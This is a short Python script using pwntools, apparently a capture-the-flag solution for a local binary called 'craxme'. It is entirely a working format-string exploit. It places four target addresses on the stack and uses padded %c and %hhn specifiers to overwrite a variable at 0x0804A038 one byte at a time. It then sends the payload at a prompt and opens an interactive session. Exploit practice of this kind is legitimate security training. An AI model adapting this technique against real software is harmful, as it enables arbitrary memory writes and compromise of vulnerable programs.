#coding=utf-8
from pwn import *
p=process('./craxme')
magic_addr=0x0804A038
 
payload = p32(magic_addr)+p32(magic_addr+1)+p32(magic_addr+2)+p32(magic_addr+3)#4*4=16
payload += '%252c'+'%7$hhn'
payload += '%164c'+'%8$hhn'
payload += '%30c'+'%9$hhn'
payload += '%44c'+'%10$hhn'
 
p.recvuntil('magic :')
p.sendline(payload)
p.interactive()
